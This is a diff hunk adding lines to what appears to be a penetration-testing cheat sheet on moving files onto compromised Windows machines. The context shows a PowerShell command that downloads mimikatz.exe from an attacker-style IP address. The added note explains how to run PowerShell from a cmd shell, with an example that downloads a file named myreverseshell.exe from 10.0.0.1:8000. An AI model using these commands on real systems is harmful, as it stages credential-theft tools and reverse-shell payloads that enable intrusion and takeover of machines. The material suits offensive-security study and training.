@@ -13,6 +13,9 @@ Detected by Antivirus and SIEM tools such as Varonis
 IEX (New-Object Net.WebClient).DownloadFile("http://192.168.119.194:8000/mimikatz.exe","C:\temp\mimikatz.exe")
 ```
 
+Important Note : In case of cmd shell and not powershell prompt, you can execute powershell command using "powershell -c 'COMMAND'". As exemple :
+C:\Users\bill\Documents>powershell -c "(New-object System.Net.WebClient).DownloadFile('http://10.0.0.1:8000/myreverseshell.exe','C:\tmp\myreverseshell.exe')"
+
 #### TFTP 
 On the old Windows version sur as Windows XP, Windows 2000
 
